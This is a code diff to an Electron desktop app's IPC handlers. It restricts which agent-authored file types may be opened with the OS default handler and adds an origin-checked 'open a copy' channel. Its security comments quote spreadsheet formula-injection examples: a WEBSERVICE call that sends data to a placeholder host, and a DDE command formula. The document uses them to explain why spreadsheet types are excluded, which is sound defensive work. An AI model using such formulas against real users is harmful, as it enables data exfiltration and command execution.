@@ -1189,10 +1189,47 @@ function createIpcRegistrar({
     //   - a regular-file requirement;
     //   - a non-empty `openPath` return means the OS refused; surface it rather
     //     than failing silently.
-    // The chip that reaches this channel is only actionable after the gateway's
-    // own /api/file-read probe has already confirmed a non-sensitive regular
-    // file (is_sensitive_path), so the credential-path denylist is enforced
+    // Every link that reaches this channel (path chip, Markdown link, Open file
+    // chip) acts only once the gateway's /api/file-kinds probe confirmed a
+    // non-sensitive regular file, so the credential-path denylist is enforced
     // upstream; the checks here are defence in depth on the launch primitive.
+    //
+    // ONLY extensions whose OS default handler opens the file in a
+    // PLAIN-TEXT viewer/editor or an image viewer and CANNOT execute the
+    // file's contents. That predicate -- not a hand-kept list -- is the
+    // security bar: shell.openPath launches the OS default handler and the
+    // path is agent-authored, so any type whose handler can run embedded
+    // content is arbitrary code execution. Four families are therefore
+    // excluded, all reachable only through this affordance (the built-in
+    // viewer, which renders inert, remains for them):
+    //   - interpreter/shell scripts (`.js`/`.mjs`/`.cjs` -> Windows Script Host,
+    //     `.py`/`.rb` -> interpreters, `.sh`/`.ps1` -> a shell);
+    //   - browser ACTIVE DOCUMENTS (`.html`/`.htm`/`.svg`/`.xml`) -- the browser
+    //     opens them at a `file://` origin and EXECUTES embedded JavaScript. A
+    //     web page reaches the browser only as a copy inside a `sandbox=""`
+    //     frame (`dashboard:open-copy` below), never as the original file;
+    //   - RICH DOCUMENTS whose default app has a content-execution surface
+    //     (`.doc`/`.docx`/`.odt` -> Word/LibreOffice VBA/macros incl. AutoOpen,
+    //     `.rtf` -> Word OLE, `.pdf` -> reader JavaScript). Legacy `.doc` is the
+    //     clearest case (VBA/AutoOpen), but the whole family fails the predicate;
+    //     and
+    //   - SPREADSHEETS (`.csv`/`.tsv`/`.xls`/`.xlsx`/`.ods`). These LOOK like
+    //     plain text, and that is the trap: the extension decides the app, and
+    //     the default app for them is Excel / Numbers / LibreOffice Calc, which
+    //     EVALUATES any cell opening with `=`, `+`, `-` or `@` as a formula. An
+    //     agent-authored `=WEBSERVICE("http://host/"&A1)` exfiltrates the sheet
+    //     and `=cmd|'/c ...'!A0` reaches DDE, so the bytes are executed by the
+    //     handler even though nothing about the file is a program. Judge the
+    //     predicate on the app that actually opens the type, not on how the
+    //     bytes read to a human.
+    // Raster images (the set `app-local-files.js` already opens for an app)
+    // pass it: an image viewer shows pixels and runs nothing.
+    const OPENABLE_EXTS = new Set([
+      ".md", ".markdown", ".txt", ".text", ".rst", ".org", ".log",
+      ".json", ".jsonc", ".json5", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".env",
+      ".css", ".graphql", ".proto",
+      ".png", ".jpg", ".jpeg", ".gif", ".webp",
+    ]);
     ipcMain.handle("dashboard:open-file", async (event, filePath) => {
       await assertLocalDashboard(event, "dashboard:open-file");
       if (typeof filePath !== "string" || filePath === "") {
@@ -1201,36 +1238,6 @@ function createIpcRegistrar({
       const fs = require("fs");
       const nodePath = require("path");
       const { openPathHardened } = require("./open-path");
-      // ONLY extensions whose OS default handler opens the file in a
-      // PLAIN-TEXT viewer/editor and CANNOT execute the file's contents. That
-      // predicate -- not a hand-kept list -- is the security bar: shell.openPath
-      // launches the OS default handler and the path is agent-authored, so any
-      // type whose handler can run embedded content is arbitrary code execution.
-      // Four families are therefore excluded, all reachable only through this
-      // affordance (the built-in viewer, which renders inert, remains for them):
-      //   - interpreter/shell scripts (`.js`/`.mjs`/`.cjs` -> Windows Script Host,
-      //     `.py`/`.rb` -> interpreters, `.sh`/`.ps1` -> a shell);
-      //   - browser ACTIVE DOCUMENTS (`.html`/`.htm`/`.svg`/`.xml`) -- the browser
-      //     opens them at a `file://` origin and EXECUTES embedded JavaScript;
-      //   - RICH DOCUMENTS whose default app has a content-execution surface
-      //     (`.doc`/`.docx`/`.odt` -> Word/LibreOffice VBA/macros incl. AutoOpen,
-      //     `.rtf` -> Word OLE, `.pdf` -> reader JavaScript). Legacy `.doc` is the
-      //     clearest case (VBA/AutoOpen), but the whole family fails the predicate;
-      //     and
-      //   - SPREADSHEETS (`.csv`/`.tsv`/`.xls`/`.xlsx`/`.ods`). These LOOK like
-      //     plain text, and that is the trap: the extension decides the app, and
-      //     the default app for them is Excel / Numbers / LibreOffice Calc, which
-      //     EVALUATES any cell opening with `=`, `+`, `-` or `@` as a formula. An
-      //     agent-authored `=WEBSERVICE("http://host/"&A1)` exfiltrates the sheet
-      //     and `=cmd|'/c ...'!A0` reaches DDE, so the bytes are executed by the
-      //     handler even though nothing about the file is a program. Judge the
-      //     predicate on the app that actually opens the type, not on how the
-      //     bytes read to a human.
-      const OPENABLE_EXTS = new Set([
-        ".md", ".markdown", ".txt", ".text", ".rst", ".org", ".log",
-        ".json", ".jsonc", ".json5", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".conf", ".env",
-        ".css", ".graphql", ".proto",
-      ]);
       try {
         // realpath BEFORE the extension test: a `.md` symlink to a key file
         // must be judged by what it actually resolves to.
@@ -1259,6 +1266,41 @@ function createIpcRegistrar({
         log(`dashboard:open-file refused: ${e && e.message}`);
         return { ok: false, error: String((e && e.message) || e) };
       }
+    });
+
+    // Open a COPY of a file the dashboard read from its gateway (see
+    // open-copy.js): a web page as a copy inside a `sandbox=""` frame in the
+    // default browser, or an `OPENABLE_EXTS` file whose gateway is on another
+    // machine.
+    // It opens no existing local file, so it does not take the local-dashboard
+    // gate: a window on a Remote Crew is the one that needs it. It admits the
+    // launch port's dashboard top frame only, as `remote-crew:forward-pane-ports`
+    // does, so a pane, an embedded page or another origin cannot write a copy.
+    ipcMain.handle("dashboard:open-copy", async (event, name, bytes) => {
+      const channel = "dashboard:open-copy";
+      if (!event || !event.sender || !event.senderFrame || event.senderFrame !== event.sender.mainFrame) {
+        logGateRejection(event && event.sender, `${channel} rejected: sender is not a top frame`);
+        throw new Error(`${channel} is restricted to the launch port's dashboard`);
+      }
+      let origin = "";
+      try {
+        origin = new URL(event.senderFrame.url).origin;
+      } catch { /* an unreadable URL matches nothing */ }
+      if (origin !== backendUrl) {
+        logGateRejection(event.sender, `${channel} rejected for sender origin ${origin || "(unreadable)"}`);
+        throw new Error(`${channel} is restricted to the launch port's dashboard`);
+      }
+      const { openCopy } = require("./open-copy");
+      const { openPathHardened } = require("./open-path");
+      return openCopy({
+        fs: require("fs"),
+        path: require("path"),
+        os: require("os"),
+        shell,
+        openPathHardened,
+        openableExts: OPENABLE_EXTS,
+        log,
+      }, name, bytes);
     });
 
     // The OS-native folder chooser behind the project picker's "Open system
